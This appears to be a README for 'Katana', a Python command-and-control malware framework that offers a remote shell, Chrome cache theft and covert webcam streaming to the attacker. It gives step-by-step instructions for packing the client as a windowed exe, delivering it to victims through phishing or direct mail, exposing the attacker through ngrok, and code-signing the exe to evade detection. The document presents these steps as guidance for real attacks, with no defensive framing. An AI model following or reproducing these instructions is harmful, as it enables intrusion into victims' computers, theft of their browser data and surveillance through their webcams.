# Katana
C2 exploitation framework


#Intro

It is a C2(Command and Control) framework written in python.

#Features

-->Staged payload=>It will not carry all the payloads at once to make itself undetectable

-->Easy to configure

-->Hassle free execution

-->Added chrome cache extraction module

-->Get shell

-->Get webcam access

##Tested on Windows 11 pro


#File wise description

-->C2_client.py=>Client file that will get executed in the victim machine

-->C2_control.py=>Command and control cli tool

-->chrome.py=>File responsible for extracting chrome cache

-->chrome_receive.py=>File responsible for recieving the chrome cache in ttacker machine

-->backdoor.py=>File to spawn cmd shell in victim machine

-->stream.py=>Responsible for getting webcam stream and send the feed over UDP to attacker machine

-->test.py=>Responsible for handling webcam feed on attacker machine

##Instructions to use

-->Change the ip address of from all the files to that of your attacking machine. Port forward if you are hacking out of the local network.

-->pip install -r requirements.txt  =>>>>>>Use this command to install all the dependencies in the attacker machine(Kali recommended).

-->Get hold of a Windows machine or install a virtual machine. Install python in the machine and also pip install the requirements with the same command as the previous.

-->Install auto-py-to-exe by using the command "pip install auto-py-to-exe" in the windows machine

-->Convert the C2_client.py file to an exe using onefile and window-based option.

-->Convert chrome.py to an exe using auto-py-to-exe in the same manner
 
-->Keep all the files in the same directory in Kali(chrome.exe, C2_control.py, backdoor.py, stream.py, test.py, chrome_receive.py)

-->Send the C2_client.exe to the victim machine by some means(phishing, direct mail, server download, etc.)

->>Run the C2_control.py on the Kali machine

->>Run the C2_client.exe in the victim machine and enjoy the opened cli interface in the attacker machine(Note: PLease run the shell access command in the last after executing the rest of the two command or if you want only the shell command)

->> Forward ports using NGROK and PORTMAP.IO



## Note: You have to add publisher to C2_client.exe by using Windows sdk and signtool to make it totally undetectable and run it hassle free.
Thank you

